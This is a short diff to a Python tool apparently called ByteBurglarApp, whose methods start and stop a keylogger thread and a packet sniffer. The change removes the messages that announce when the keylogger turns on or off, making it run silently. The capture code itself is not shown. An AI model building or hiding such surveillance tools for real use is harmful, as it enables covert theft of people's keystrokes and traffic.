@@ -41,13 +41,11 @@ class ByteBurglarApp:
         if self.keylogger_thread is None or not self.keylogger_thread.is_alive():
             self.keylogger_thread = KeyloggerThread()
             self.keylogger_thread.start()
-            print("Keylogger activated!")
 
     def deactivate_keylogger(self):
         if self.keylogger_thread is not None:
             self.keylogger_thread.stop()
             self.keylogger_thread = None
-            print('Keylogger deactivated!')
 
     def activate_packet_sniffer(self):
         print("Packet sniffer activated!")
